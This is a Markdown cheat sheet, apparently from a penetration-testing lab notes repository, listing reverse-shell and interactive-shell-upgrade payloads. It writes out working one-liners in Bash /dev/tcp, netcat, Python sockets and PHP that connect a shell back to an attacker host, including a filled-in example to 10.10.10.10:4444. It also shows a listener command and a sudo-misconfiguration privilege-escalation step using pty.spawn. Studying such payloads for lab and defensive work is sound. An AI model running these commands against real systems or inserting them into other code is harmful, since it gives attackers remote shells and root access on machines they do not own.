# Reverse & Interactive Shells Cheat Sheet

## Overview

Reference payloads for obtaining a shell (reverse, network-based) or upgrading an existing non-interactive shell to a fully interactive one (as used in this repository's privilege-escalation step — see [`docs/07-Privilege-Escalation`](../docs/07-Privilege-Escalation/README.md)).

> [!NOTE]
> The technique actually used in this repository's notes was a **local, non-network** interactive-shell upgrade (`pty.spawn`), triggered via a `sudo` misconfiguration — not a network-based reverse shell. Both categories are included here for completeness as general reference material.

## Common Syntax

Reverse shells generally follow the pattern: *attacker starts a listener, target initiates an outbound connection back to it and binds a shell to that connection.* Interactive-shell upgrades instead take an already-obtained, limited shell and give it a full TTY.

## Useful Commands

### Interactive Shell Upgrade (local)

| Command | Language |
|---|---|
| `python -c 'import pty;pty.spawn("/bin/bash")'` | Python (used in this repository, via a `sudo`-permitted script) |
| `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Python 3 |
| `SHELL=/bin/bash script -q /dev/null` | `script` utility |

### Reverse Shells (network-based reference)

| Command | Language |
|---|---|
| `bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1` | Bash |
| `nc -e /bin/bash <attacker-ip> <port>` | Netcat (where `-e` is supported) |
| `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker-ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` | Python |
| `php -r '$sock=fsockopen("<attacker-ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'` | PHP |

## Important Options

| Concept | Description |
|---|---|
| PTY | A pseudo-terminal upgrade lets you use tab-completion, arrow keys, `Ctrl+C` to interrupt individual commands (rather than killing the shell), and full-screen tools like `vim`/`nano` |
| Listener | The attacker-side process (commonly `nc -lvnp <port>`) that waits for the target to connect back |
| Staged vs. non-staged | Some payload frameworks distinguish between sending the full payload up front vs. a small stager that pulls the rest down |

## Examples

```bash
# Local interactive-shell upgrade after gaining code execution
# (as used in this repository via a sudo-permitted, user-writable script)
echo 'import pty;pty.spawn("/bin/bash")' > permitted_script.py
sudo python /path/to/permitted_script.py
```

```bash
# Attacker-side listener for a network reverse shell (general reference)
nc -lvnp 4444

# Target-side trigger (general reference; not used in this repository)
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

## Common Mistakes

- Forgetting that `pty.spawn` still leaves you without full job control (`Ctrl+Z`) until further TTY settings (e.g., `stty raw -echo` on the attacker side, then `fg`) are configured — a common follow-up step after the initial upgrade.
- Assuming every target has `python`, `nc -e`, or `/dev/tcp` support (Bash's `/dev/tcp` requires Bash to have been compiled with that feature).
- Hardcoding the wrong interface IP for a reverse shell listener (e.g., using a local/NAT interface instead of the VPN tunnel address reachable from the target).

## References

- [Python `pty` module documentation](https://docs.python.org/3/library/pty.html)
- [PayloadsAllTheThings — Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

## Key Takeaways

- Interactive-shell upgrades (`pty.spawn` and similar) are useful even without a network-based reverse shell — any avenue of code execution can be leveraged to obtain a usable interactive shell.
- Always confirm what interpreters/utilities are actually present on a target before committing to a specific payload.
